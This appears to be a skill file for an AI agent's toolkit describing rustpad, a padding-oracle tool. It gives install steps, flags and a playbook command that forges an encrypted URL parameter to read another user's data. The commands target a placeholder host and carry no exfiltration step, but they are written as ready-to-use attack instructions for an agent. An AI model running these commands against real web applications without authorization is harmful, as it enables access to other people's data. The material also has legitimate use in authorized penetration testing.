---
name: rustpad-oracle-gui
description: "rustpad: Forges encrypted parameters for horizontal privilege escalation. Signals: cryptographic attack, encryption cracking, decryption mode, forged ciphertext mode, injection point marking."
zh-signals: "rustpad: 加密参数伪造(水平越权)。信号:密码学攻击,加密破解,解密模式,伪造密文模式,注入点标记。"
when-to-use: >-
  Use when a web application exposes encrypted parameters and you suspect a
  padding oracle, to interactively decrypt or forge ciphertext for horizontal
  privilege escalation; requires the target URL and cipher block size.
---

# rustpad

- Attack Category: C49 Cryptographic Misuse and Protocol Analysis
- Upstream Repository: https://github.com/Kibouo/rustpad
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
cargo install rustpad
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `rustpad --url 'https://t.com/?id=xxx' --block-size 16` | Interactive padding oracle |
| `--decrypt` | Decryption mode |
| `--encrypt` | Forged ciphertext mode |
| `--query 'id=FUZZ'` | Injection point marking |

## Attack Scenario Playbook

### Forging encrypted parameters (horizontal privilege escalation)

```bash
rustpad --url 'https://t.com/view?doc=IVCIPHER' --block-size 16 --encrypt
# Modify the user_id ciphertext to access another user's data
```

## Notes

Interactive TUI padding oracle tool with an encryption mode, forging arbitrary plaintext ciphertexts, which gives it far more capability than decrypt-only tools.
